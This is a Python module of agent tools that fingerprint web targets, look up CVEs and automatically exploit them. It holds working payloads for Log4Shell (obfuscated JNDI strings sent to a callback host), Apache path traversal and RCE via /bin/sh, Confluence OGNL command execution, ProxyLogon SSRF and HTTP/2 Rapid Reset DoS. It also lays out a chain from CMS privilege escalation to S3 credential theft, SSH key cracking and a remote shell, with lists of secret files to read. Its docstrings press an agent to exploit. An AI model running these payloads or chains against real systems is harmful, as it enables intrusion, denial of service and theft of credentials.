"""
CVE-Targeted Exploitation Chain

Automates the CVE exploitation workflow:
  1. Technology/version fingerprinting of target
  2. CVE lookup via NVD/CVE database
  3. Exploit search (SearchSploit / ExploitDB / GitHub PoC)
  4. Automated PoC testing for known safe-to-test CVEs
  5. Manual exploitation guidance for confirmed CVEs

Supported auto-exploit categories:
  - Web CVEs (CMS, frameworks, libraries)
  - Log4Shell (CVE-2021-44228)
  - Spring4Shell (CVE-2022-22965)
  - ProxyLogon (CVE-2021-26855)
  - Apache RCE (CVE-2021-41773, CVE-2021-42013)
  - Confluence RCE (CVE-2022-26134)
  - GitLab (CVE-2021-22205)
"""

from __future__ import annotations

import json
import logging
import re
import subprocess
import urllib.parse
from typing import Optional

import requests

from src.sdk.tool import function_tool

_DEFAULT_HEADERS = {"User-Agent": "Mozilla/5.0 (CyberCoPilot/1.0)"}
_TIMEOUT = 20
logger = logging.getLogger(__name__)


def _get(url: str, params: dict | None = None) -> Optional[requests.Response]:
    try:
        return requests.get(url, params=params, headers=_DEFAULT_HEADERS,
                            timeout=_TIMEOUT, verify=False)
    except Exception as e:
        logger.debug(f"_get {url}: {e}")
        return None


@function_tool()
def cve_lookup(software: str, version: str = "", max_results: int = 10, max_age_years: int = 5) -> str:
    """
    Look up CVEs for a specific software/version from the NVD database.
    Filters results by recency (default: last 5 years) and sorts by severity.

    Args:
        software: Software/product name (e.g. 'Apache', 'WordPress', 'log4j', 'Spring')
        version: Specific version to filter by (e.g. '2.17.0') — empty = all versions
        max_results: Maximum CVEs to return (default: 10)
        max_age_years: Only show CVEs published within this many years (default: 5)

    Returns:
        List of CVEs with CVSS scores, severity, EPSS probability, and exploitation next-steps.
        IMPORTANT: After reviewing results, you MUST call cve_auto_exploit() on at least the
        top 1-2 CVEs to verify exploitability. Do NOT just collect CVEs without testing.
    """
    out = [f"=== CVE Lookup: {software} {version}", ""]

    from datetime import datetime, timedelta
    cutoff_date = datetime.now() - timedelta(days=max_age_years * 365)
    cutoff_date.strftime("%Y-%m-%dT00:00:00.000")

    # NVD API — sort by published date descending if possible, or just search
    params = {
        "keywordSearch": f"{software} {version}".strip(),
        "resultsPerPage": str(min(max_results * 4, 100)),  # Fetch extra to filter
        "startIndex": "0",
    }
    try:
        r = requests.get(
            "https://services.nvd.nist.gov/rest/json/cves/2.0",
            params=params, headers=_DEFAULT_HEADERS, timeout=30
        )
        if r.status_code == 200:
            data = r.json()
            vulns = data.get("vulnerabilities", [])

            # Parse and score all CVEs
            parsed_cves = []
            for v in vulns:
                cve = v.get("cve", {})
                cve_id = cve.get("id", "")
                desc = ""
                for d in cve.get("descriptions", []):
                    if d.get("lang") == "en":
                        desc = d.get("value", "")[:200]
                        break

                # Skip irrelevant results (keyword search returns unrelated software)
                software_lower = software.lower()
                desc_lower = desc.lower()
                if software_lower not in desc_lower and software_lower not in cve_id.lower():
                    # Check if the software name appears anywhere in the CVE data
                    cve_text = json.dumps(v).lower()
                    if software_lower not in cve_text:
                        continue

                # CVSS score
                metrics = cve.get("metrics", {})
                score = 0.0
                severity = "N/A"
                for key in ["cvssMetricV31", "cvssMetricV30", "cvssMetricV2"]:
                    if key in metrics and metrics[key]:
                        cvss_data = metrics[key][0].get("cvssData", {})
                        score = float(cvss_data.get("baseScore", 0))
                        severity = metrics[key][0].get("baseSeverity",
                                   cvss_data.get("baseSeverity", "N/A"))
                        break

                published = cve.get("published", "")[:10]

                # Version match relevance boost
                version_match = version and version in desc_lower

                parsed_cves.append({
                    "id": cve_id, "score": score, "severity": severity,
                    "published": published, "desc": desc,
                    "version_match": version_match,
                })

            # Filter out older than max_age_years
            parsed_cves = [c for c in parsed_cves if c["published"] >= cutoff_date.strftime("%Y")]

            # Sort by CVSS score (highest first), then version-match
            parsed_cves.sort(key=lambda c: (c["version_match"], c["score"]), reverse=True)
            parsed_cves = parsed_cves[:max_results]

            out.append(f"Found {data.get('totalResults', 0)} total CVEs, showing top {len(parsed_cves)} (last {max_age_years} years, sorted by severity)\n")

            # Fetch EPSS data for top CVEs
            cve_ids_str = ",".join(c["id"] for c in parsed_cves[:10])
            epss_scores = {}
            try:
                epss_r = requests.get(
                    f"https://api.first.org/data/v1/epss?cve={cve_ids_str}",
                    timeout=10
                )
                if epss_r.status_code == 200:
                    for item in epss_r.json().get("data", []):
                        epss_scores[item["cve"]] = {
                            "epss": float(item.get("epss", 0)),
                            "percentile": float(item.get("percentile", 0)),
                        }
            except Exception:
                pass

            for c in parsed_cves:
                epss = epss_scores.get(c["id"], {})
                epss_str = ""
                if epss:
                    epss_pct = epss['epss'] * 100
                    epss_str = f" | EPSS:{epss_pct:.1f}%"
                    if epss_pct > 10:
                        epss_str += " ⚡HIGH EXPLOIT PROB"

                version_flag = " ✓VERSION_MATCH" if c["version_match"] else ""
                out.append(f"[{c['id']}] CVSS:{c['score']} ({c['severity']}){epss_str}{version_flag} — {c['published']}")
                out.append(f"  {c['desc']}")
                out.append("")

            if not parsed_cves:
                out.append(f"No relevant CVEs found for {software} {version} in the last {max_age_years} years.")
        else:
            out.append(f"NVD API error: HTTP {r.status_code}")
    except Exception as e:
        out.append(f"NVD lookup failed: {e}")

    # Also check SearchSploit
    out.append("── SearchSploit Results ────────────────────────")
    query = f"{software} {version}".strip()
    try:
        r = subprocess.run(["searchsploit", query, "--json"],
                           capture_output=True, text=True, timeout=30)
        if r.returncode == 0:
            ss_data = json.loads(r.stdout)
            exploits = ss_data.get("RESULTS_EXPLOIT", [])[:10]
            if exploits:
                out.append(f"  {len(exploits)} exploits found in ExploitDB:")
                for ex in exploits:
                    out.append(f"  [{ex.get('EDB-ID', '?')}] {ex.get('Title', '')}")
                    out.append(f"    Path: {ex.get('Path', '')}")
            else:
                out.append("  No exploits in ExploitDB")
    except FileNotFoundError:
        out.append("  searchsploit not available")
    except Exception as e:
        out.append(f"  searchsploit error: {e}")

    # Mandatory action reminder
    out.append("")
    out.append("── ⚠️ NEXT STEPS GUIDANCE ─────────────────────")
    out.append("If a CVE matches the EXACT software AND version:")
    out.append("  1. Call cve_auto_exploit(target_url, cve_id) if it is an RCE/SSRF/LFI")
    out.append("  2. If cve_auto_exploit doesn't support it, search GitHub/ExploitDB")
    out.append("If NO CVEs match the EXACT version, DO NOT hallucinate exploits.")
    out.append("Do NOT randomly fire CVEs that belong to other products!")

    return "\n".join(out)


@function_tool()
async def cve_auto_exploit(
    target_url: str,
    cve_id: str,
    callback_url: str = "",
    verify_only: bool = True,
) -> str:
    """
    Attempt automated exploitation of a specific CVE against a target.

    Supports automated testing for:
      - CVE-2021-44228 (Log4Shell) — JNDI injection in log4j
      - CVE-2022-22965 (Spring4Shell) — Spring Framework RCE
      - CVE-2021-41773 (Apache Path Traversal/RCE)
      - CVE-2021-42013 (Apache RCE — path traversal bypass)
      - CVE-2022-26134 (Confluence OGNL RCE)
      - CVE-2021-26855 (ProxyLogon — Exchange SSRF)
      - CVE-2021-22205 (GitLab RCE via ExifTool)
      - CVE-2023-44487 (HTTP/2 Rapid Reset DoS)

    Args:
        target_url: Full target URL (https://target.com or https://target.com/path)
        cve_id: CVE identifier (e.g. CVE-2021-44228)
        callback_url: OOB callback URL for blind exploitation
                      (e.g. https://yourburp.collaborator.com or interactsh host)
        verify_only: If True (default), only check for vulnerability, do NOT exploit.
                     Set False to attempt actual exploitation (authorized testing only)

    Returns:
        Exploitation attempt results with vulnerability confirmation
    """
    out = [f"=== CVE Auto-Exploit: {cve_id}", f"  Target : {target_url}",
           f"  Mode   : {'verify-only' if verify_only else 'EXPLOIT'}", ""]

    cve_upper = cve_id.upper()

    # ── Platform mismatch guard ───────────────────────────────────────────────
    # CVE-to-platform mapping: (cve_substring, required_platform_keyword, display_name)
    # For header-only platforms (apache, spring, etc.) the keyword is checked in
    # response headers. For body-only platforms (telerik) it is checked in the
    # first 4 KB of the response body where the library always leaves fingerprints.
    _CVE_PLATFORM_MAP = [
        ("2021-41773", "apache",    "Apache HTTP Server 2.4.49"),
        ("2021-42013", "apache",    "Apache HTTP Server 2.4.49-2.4.50"),
        ("2021-44228", "log4j",     "Log4j (Java apps)"),
        ("2022-22965", "spring",    "Spring Framework"),
        ("2022-26134", "confluence", "Atlassian Confluence"),
        ("2021-26855", "exchange",  "Microsoft Exchange"),
        ("2021-22205", "gitlab",    "GitLab"),
        # Telerik UI for ASP.NET AJAX — fingerprint is in HTML body, not headers.
        # Typical evidence: Telerik.Web.UI, RadAjaxManager, WebResource.axd?type=rau
        ("2017-9248",  "telerik",   "Telerik UI for ASP.NET AJAX"),
        ("2017-11317", "telerik",   "Telerik UI for ASP.NET AJAX"),
        ("2019-18935", "telerik",   "Telerik UI for ASP.NET AJAX"),
        ("2014-2217",  "telerik",   "Telerik UI for ASP.NET AJAX"),
    ]
    try:
        _r = requests.get(target_url, headers=_DEFAULT_HEADERS, timeout=8, verify=False)
        # Combine headers AND first 4 KB of body — some platforms (Telerik) only
        # advertise themselves in HTML source, not in response headers.
        _server_hdrs = (_r.headers.get("Server", "") + " " +
                        _r.headers.get("X-Powered-By", "")).lower()
        _body_snippet = _r.text[:4096].lower()
        _server = _server_hdrs + " " + _body_snippet
        for _cve_sub, _platform_kw, _platform_name in _CVE_PLATFORM_MAP:
            if _cve_sub in cve_upper:
                if _platform_kw not in _server:
                    out.append(
                        f"⚠️  PLATFORM MISMATCH — {cve_id} targets {_platform_name}\n"
                        f"   Detected server: '{_server_hdrs.strip() or '(none)'}'\n"
                        f"   No evidence of '{_platform_kw}' found in headers or page body.\n"
                        f"   This CVE is unlikely to apply to this target.\n"
                        f"   Aborting to avoid wasted iterations. Confirm the technology stack first."
                    )
                    return "\n".join(out)
                break
    except Exception:
        pass  # if we can't reach it, continue anyway and let the exploit logic handle it

    # ── CVE-2021-44228 Log4Shell ──────────────────────────────────────────────
    if "2021-44228" in cve_upper or "LOG4SHELL" in cve_upper:
        out.append("── Log4Shell (CVE-2021-44228) ──────────────────")
        jndi_payloads = [
            "${jndi:ldap://127.0.0.1:1389/a}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1:1389/a}",
            "${${lower:j}ndi:${lower:l}dap://127.0.0.1:1389/a}",
        ]
        if callback_url:
            jndi_payloads = [p.replace("127.0.0.1:1389", callback_url) for p in jndi_payloads]

        inject_headers = ["User-Agent", "X-Forwarded-For", "X-Api-Version",
                          "Referer", "X-Filename", "Content-Disposition"]

        for header in inject_headers:
            for payload in jndi_payloads[:2]:
                try:
                    r = requests.get(target_url, headers={**_DEFAULT_HEADERS, header: payload},
                                     timeout=10, verify=False)
                    out.append(f"  [{header}] HTTP {r.status_code} — payload sent: {payload[:50]}")
                    if r.status_code == 500:
                        out.append(f"  → HTTP 500 with JNDI payload in {header} — possible Log4Shell!")
                except Exception as e:
                    out.append(f"  [{header}] Error: {e}")

        if callback_url:
            out.append(f"\n  Monitor {callback_url} for DNS/HTTP callbacks to confirm Log4Shell")
        out.append("\n  Tool: https://github.com/fullhunt/log4j-scan")
        out.append("  Tool: python3 log4j-scan.py -u " + target_url)

    # ── CVE-2021-41773 Apache Path Traversal / RCE ────────────────────────────
    elif "2021-41773" in cve_upper or "2021-42013" in cve_upper:
        out.append("── Apache Path Traversal/RCE ───────────────────")
        parsed = urllib.parse.urlparse(target_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        traversal_paths = [
            "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",  # CVE-2021-42013
        ]
        for path in traversal_paths:
            r = _get(base + path)
            if r and "root:" in (r.text or ""):
                out.append(f"  PATH TRAVERSAL CONFIRMED: {base + path}")
                out.append(f"  Content: {r.text[:200]}")
            elif r:
                out.append(f"  [{path[:50]}] HTTP {r.status_code}")

        if not verify_only:
            rce_path = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
            try:
                r = requests.post(base + rce_path,
                                  data="echo;id",
                                  headers={"Content-Type": "application/x-www-form-urlencoded"},
                                  timeout=10, verify=False)
                if "uid=" in (r.text or ""):
                    out.append(f"  RCE CONFIRMED: {r.text[:200]}")
            except Exception as e:
                out.append(f"  RCE attempt error: {e}")

    # ── CVE-2022-26134 Confluence OGNL ────────────────────────────────────────
    elif "2022-26134" in cve_upper:
        out.append("── Confluence OGNL RCE (CVE-2022-26134) ───────")
        parsed = urllib.parse.urlparse(target_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        ognl_payloads = [
            "/%24%7B%28%23a%3D%40org.apache.commons.lang.StringUtils%40EMPTY%29.%28%23b%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%29%7D/",
            "/${%40java.lang.Runtime%40getRuntime().exec(\"id\")}/",
        ]
        if not verify_only:
            for ognl in ognl_payloads:
                r = _get(base + ognl)
                if r and "uid=" in (r.text or ""):
                    out.append(f"  OGNL RCE CONFIRMED: {r.text[:200]}")
                elif r:
                    out.append(f"  [OGNL] HTTP {r.status_code}")
        else:
            out.append("  Verify-only mode — manual test with Burp:")
            out.append(f"  GET {base}/${{%40java.lang.Runtime%40getRuntime().exec(\"id\")}}/")

    # ── CVE-2021-26855 ProxyLogon (Exchange SSRF) ─────────────────────────────
    elif "2021-26855" in cve_upper:
        out.append("── ProxyLogon (CVE-2021-26855) ─────────────────")
        ssrf_path = "/owa/auth/x.js"
        cookie = "Cookie: X-AnonResource=true; X-BEResource=localhost/owa/auth/x.js~1941962753"
        try:
            r = requests.get(
                urllib.parse.urljoin(target_url, ssrf_path),
                headers={**_DEFAULT_HEADERS, "Cookie": cookie},
                timeout=15, verify=False
            )
            if r.status_code == 200:
                out.append(f"  Possible ProxyLogon SSRF: HTTP {r.status_code}")
                out.append("  → Exchange server may be vulnerable to CVE-2021-26855")
            else:
                out.append(f"  HTTP {r.status_code} — may not be vulnerable or path differs")
        except Exception as e:
            out.append(f"  Error: {e}")
        out.append("  Tool: https://github.com/GossiTheDog/scanning/blob/main/log4j-scan.py")

    # ── CVE-2023-44487 HTTP/2 Rapid Reset ────────────────────────────────────
    elif "2023-44487" in cve_upper:
        out.append("── HTTP/2 Rapid Reset DoS (CVE-2023-44487) ────")
        from src.tools.race_condition import http2_rapid_reset_check
        return await http2_rapid_reset_check.invoke(url=target_url)

    # ── CVE-2025-2304 Camaleon CMS Privilege Escalation ──────────────────────
    elif "2025-2304" in cve_upper:
        out.append("── Camaleon CMS Privilege Escalation (CVE-2025-2304) ──")
        out.append("  Delegating to camaleon_privesc() ...")
        out.append("  NOTE: Requires username+password — call camaleon_privesc() directly:")
        out.append(f"    camaleon_privesc(base_url='{target_url}', username='<user>', password='<pass>')")
        out.append("")
        out.append("  CVSS: 9.4 (Critical) — Improper Access Control")
        out.append("  Affects: Camaleon CMS ≤ 2.9.0")
        out.append("  Impact: Any authenticated user (incl. 'subscriber') can escalate to Administrator")
        out.append("  Vector: POST /admin/users/<id> — role/group assignment lacks server-side validation")
        out.append("")
        out.append("  Attack chain:")
        out.append("    1. auth_register() or auth_login() → get subscriber session")
        out.append("    2. camaleon_privesc() → escalate to admin")
        out.append("    3. camaleon_admin_enum() → extract S3/MinIO credentials from Filesystem Settings")
        out.append("    4. s3_bucket_explorer() → list buckets and download SSH key")
        out.append("    5. ssh_key_crack() → crack passphrase")
        out.append("    6. ssh_exec() → remote shell")

    # ── CVE-2024-46987 Camaleon CMS Path Traversal / LFI ─────────────────────
    elif "2024-46987" in cve_upper:
        out.append("── Camaleon CMS Path Traversal/LFI (CVE-2024-46987) ──")
        out.append("  Delegating to camaleon_lfi() — call it directly:")
        out.append(f"    camaleon_lfi(base_url='{target_url}', username='<user>', password='<pass>', filepath='/etc/passwd')")
        out.append("")
        out.append("  CVSS: 7.7 (High) — Path Traversal")
        out.append("  Affects: Camaleon CMS ≤ 2.9.0")
        out.append("  Impact: Authenticated user can read arbitrary server files via media upload")
        out.append("  Vector: POST /admin/media/ajax_upload — filename not sanitized (../../etc/passwd)")
        out.append("")
        out.append("  Useful read targets:")
        out.append("    /etc/passwd             — user list")
        out.append("    /etc/hosts              — internal network map")
        out.append("    /home/<user>/.ssh/id_rsa — SSH private key")
        out.append("    /var/www/html/config/database.yml — DB credentials (Rails)")
        out.append("    /var/www/html/.env — environment variables with secrets")

    # ── Generic: SearchSploit + guidance ─────────────────────────────────────
    else:
        out.append(f"── Generic CVE Exploitation: {cve_id} ────────────")
        if not verify_only:
            # No active exploit code exists for this CVE — escalating to exploit
            # mode returns the same output as verify-only.  Inform the agent.
            out.append(
                "ℹ️  No framework-native exploit code is available for this CVE ID.\n"
                "   verify_only=False has NO extra effect here — this call is "
                "identical to verify-only mode.\n"
                "   Do NOT call cve_auto_exploit again for this CVE.\n"
                "   To actively exploit, manually run:\n"
                "     searchsploit <CVE-ID>  then  searchsploit -m <exploit-id>.py\n"
                "     or use metasploit_run() if a Metasploit module exists."
            )
        # SearchSploit
        try:
            r = subprocess.run(["searchsploit", cve_id, "--json"],
                               capture_output=True, text=True, timeout=30)
            if r.returncode == 0:
                ss_data = json.loads(r.stdout)
                exploits = ss_data.get("RESULTS_EXPLOIT", [])
                if exploits:
                    out.append(f"ExploitDB exploits for {cve_id}:")
                    for ex in exploits[:5]:
                        out.append(f"  [{ex.get('EDB-ID')}] {ex.get('Title')}")
                        out.append(f"    searchsploit -m {ex.get('Path', '').split('/')[-1]}")
                else:
                    out.append(f"No ExploitDB entries for {cve_id}")
        except Exception as e:
            out.append(f"  searchsploit: {e}")

        # GitHub PoC search
        try:
            gh_r = requests.get(
                "https://api.github.com/search/repositories",
                params={"q": f"{cve_id} poc exploit", "sort": "updated", "per_page": "5"},
                headers={"Accept": "application/vnd.github.v3+json"},
                timeout=15
            )
            if gh_r.status_code == 200:
                repos = gh_r.json().get("items", [])
                if repos:
                    out.append(f"\nGitHub PoC repos for {cve_id}:")
                    for repo in repos[:5]:
                        out.append(f"  {repo.get('html_url')} ⭐{repo.get('stargazers_count', 0)}")
        except Exception as e:
            out.append(f"  GitHub search: {e}")

    out.append("")
    out.append("Manual exploitation reference:")
    out.append(f"  https://www.exploit-db.com/search?cve={cve_id.replace('CVE-', '')}")
    out.append(f"  https://nvd.nist.gov/vuln/detail/{cve_id}")

    return "\n".join(out)


@function_tool()
def fingerprint_and_cve_chain(
    target_url: str,
    extra_software: str = "",
) -> str:
    """
    Automatically fingerprint the target's technology stack and look up CVEs
    for all identified software. Provides prioritized exploitation guidance.

    Steps:
      1. HTTP header fingerprinting (Server, X-Powered-By, Set-Cookie)
      2. HTML meta fingerprinting (WordPress, Joomla, Drupal, etc.)
      3. Tool-based fingerprinting (whatweb/nuclei if available)
      4. CVE lookup for each identified technology
      5. Ranked exploitation plan

    Args:
        target_url: Target URL to fingerprint
        extra_software: Additional software to check (e.g. 'Apache 2.4.49,Spring 5.3.17')

    Returns:
        Technology fingerprint + prioritized CVE exploitation plan
    """
    out = [f"=== Fingerprint + CVE Chain: {target_url}", ""]
    identified = []

    # ── HTTP headers ──────────────────────────────────────────────────────────
    out.append("── HTTP Header Fingerprinting ──────────────────")
    try:
        r = requests.get(target_url, headers=_DEFAULT_HEADERS,
                         timeout=15, verify=False, allow_redirects=True)
        headers = dict(r.headers)
        html = r.text or ""

        server = headers.get("Server", "")
        powered = headers.get("X-Powered-By", "")
        x_gen = headers.get("X-Generator", "")

        if server:
            out.append(f"  Server: {server}")
            identified.append(server)
        if powered:
            out.append(f"  Powered-By: {powered}")
            identified.append(powered)
        if x_gen:
            out.append(f"  Generator: {x_gen}")
            identified.append(x_gen)

        # CMS detection from HTML
        cms_fingerprints = {
            "WordPress":  [r"wp-content/", r"wp-includes/", r"/wp-json/"],
            "Joomla":     [r"/media/jui/css/", r"Joomla!", r"/components/com_"],
            "Drupal":     [r"Drupal.settings", r"/sites/default/files/", r"drupal.js"],
            "Laravel":    [r"_token.*?laravel", r"Laravel"],
            "Django":     [r"csrfmiddlewaretoken", r"__django"],
            "Spring":     [r"Spring Framework", r"Whitelabel Error Page"],
            "Express":    [r"X-Powered-By: Express"],
            "Rails":      [r"data-turbolinks", r"rails-ujs"],
        }
        for cms, patterns in cms_fingerprints.items():
            for pattern in patterns:
                if re.search(pattern, html, re.IGNORECASE):
                    identified.append(cms)
                    out.append(f"  CMS: {cms} detected via pattern '{pattern}'")
                    break

        # Version extraction
        version_patterns = [
            r"WordPress (\d+\.\d+[\.\d]*)",
            r"Joomla! (\d+\.\d+[\.\d]*)",
            r"Apache/(\d+\.\d+[\.\d]*)",
            r"nginx/(\d+\.\d+[\.\d]*)",
            r"PHP/(\d+\.\d+[\.\d]*)",
            r"Spring Boot (\d+\.\d+[\.\d]*)",
        ]
        for pat in version_patterns:
            m = re.search(pat, server + powered + x_gen + html[:2000], re.IGNORECASE)
            if m:
                out.append(f"  Version: {m.group(0)}")
                identified.append(m.group(0))

    except Exception as e:
        out.append(f"  Fingerprint error: {e}")

    # Add extra software
    if extra_software:
        for sw in extra_software.split(","):
            sw = sw.strip()
            if sw:
                identified.append(sw)

    # ── whatweb ───────────────────────────────────────────────────────────────
    out.append("")
    out.append("── whatweb Fingerprinting ──────────────────────")
    try:
        r = subprocess.run(["whatweb", target_url, "--log-json=/tmp/ww.json"],
                           capture_output=True, text=True, timeout=30)
        out.append(f"  {r.stdout[:300]}")
        try:
            import os
            if os.path.exists("/tmp/ww.json"):
                with open("/tmp/ww.json") as f:
                    ww_data = json.load(f)
                plugins = list(ww_data[0].get("plugins", {}).keys()) if ww_data else []
                identified.extend(plugins[:10])
                out.append(f"  whatweb plugins: {', '.join(plugins[:10])}")
        except Exception:
            pass
    except FileNotFoundError:
        out.append("  whatweb not installed")
    except Exception as e:
        out.append(f"  whatweb error: {e}")

    out.append("")
    identified = list(dict.fromkeys(identified))  # deduplicate
    out.append(f"── Identified Technologies ({len(identified)}) ────────────────")
    for tech in identified:
        out.append(f"  {tech}")

    if not identified:
        out.append("  No technology information gathered")
        return "\n".join(out)

    # ── CVE lookup for each ───────────────────────────────────────────────────
    out.append("")
    out.append("── CVE Lookup for Identified Stack ─────────────")
    cve_results = []
    for tech in identified[:5]:  # Limit API calls
        tech_clean = re.sub(r"[/:]", " ", tech).split()
        if len(tech_clean) >= 1:
            software = tech_clean[0]
            version = tech_clean[1] if len(tech_clean) > 1 else ""
            try:
                r = requests.get(
                    "https://services.nvd.nist.gov/rest/json/cves/2.0",
                    params={"keywordSearch": f"{software} {version}".strip(),
                            "resultsPerPage": "5",
                            "cvssV3Severity": "CRITICAL"},
                    headers=_DEFAULT_HEADERS, timeout=20
                )
                if r.status_code == 200:
                    data = r.json()
                    vulns = data.get("vulnerabilities", [])
                    if vulns:
                        out.append(f"\n  [{software} {version}] — {data.get('totalResults', 0)} total CVEs, showing CRITICAL:")
                        for v in vulns[:3]:
                            cve = v.get("cve", {})
                            cve_id = cve.get("id", "")
                            desc = ""
                            for d in cve.get("descriptions", []):
                                if d.get("lang") == "en":
                                    desc = d.get("value", "")[:150]
                            metrics = cve.get("metrics", {})
                            score = "N/A"
                            for key in ["cvssMetricV31", "cvssMetricV30"]:
                                if key in metrics and metrics[key]:
                                    score = metrics[key][0].get("cvssData", {}).get("baseScore", "N/A")
                                    break
                            out.append(f"    [{cve_id}] CVSS:{score} — {desc}")
                            cve_results.append({"id": cve_id, "score": score, "software": software})
                else:
                    out.append(f"  [{software}] NVD API error: {r.status_code}")
            except Exception as e:
                out.append(f"  [{software}] CVE lookup error: {e}")

    # ── Exploitation plan ─────────────────────────────────────────────────────
    if cve_results:
        out.append("")
        out.append("── Prioritized Exploitation Plan ───────────────")
        cve_results.sort(key=lambda x: float(x["score"]) if str(x["score"]).replace(".", "").isdigit() else 0, reverse=True)
        for i, cve in enumerate(cve_results[:5], 1):
            out.append(f"  {i}. {cve['id']} (CVSS:{cve['score']}) — {cve['software']}")
            out.append(f"     cve_auto_exploit('{target_url}', '{cve['id']}')")

    return "\n".join(out)

# ---------------------------------------------------------------------------
# cvemap — ProjectDiscovery CVE Map
# ---------------------------------------------------------------------------

@function_tool()
def cvemap_search(
    query: str,
    options: str = "-severity critical,high -limit 20",
) -> str:
    """
    Search and filter CVEs using ProjectDiscovery cvemap — provides real-time CVE
    intelligence with EPSS exploitability scores, CISA KEV status, PoC availability,
    and nuclei template availability.

    Advantages over cve_lookup:
    - EPSS score: probability this CVE will be exploited in the wild (0-100%)
    - CISA KEV flag: confirms it IS being actively exploited right now
    - nuclei_template flag: confirms nuclei can auto-scan for it
    - GitHub PoC count: shows how many public PoCs exist
    - Hackability filter: show only CVEs with PoC + template + high EPSS

    Args:
        query: Search term — product name, CVE ID, or CWE ID
               Examples: 'apache', 'CVE-2025-26794', 'cwe-89', 'exim'
        options: cvemap filter flags:
                 '-severity critical,high' — filter by severity
                 '-epss-score 0.5' — only CVEs with EPSS >= 50%
                 '-kev' — only CISA KEV (actively exploited)
                 '-has-nuclei' — only CVEs with nuclei templates
                 '-limit 10' — max results
                 '-product exim -version 4.99'

    Returns:
        CVE list with CVSS, EPSS score, KEV status, PoC count, nuclei availability
    """
    try:
        cmd = ["cvemap", "-q", query] + options.split()
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        output = result.stdout.strip() or result.stderr.strip()

        if not output:
            return f"No CVEs found by cvemap for: {query}"
        return f"## cvemap CVE Intelligence — {query}\n\n{output}"

    except FileNotFoundError:
        return (
            "Error: cvemap not found.\n"
            "Install: go install github.com/projectdiscovery/cvemap/cmd/cvemap@latest\n"
            "Requires a free ProjectDiscovery API key: https://cloud.projectdiscovery.io"
        )
    except subprocess.TimeoutExpired:
        return f"Error: cvemap timed out after 60 seconds for: {query}"
    except Exception as e:
        return f"Error: {e}"
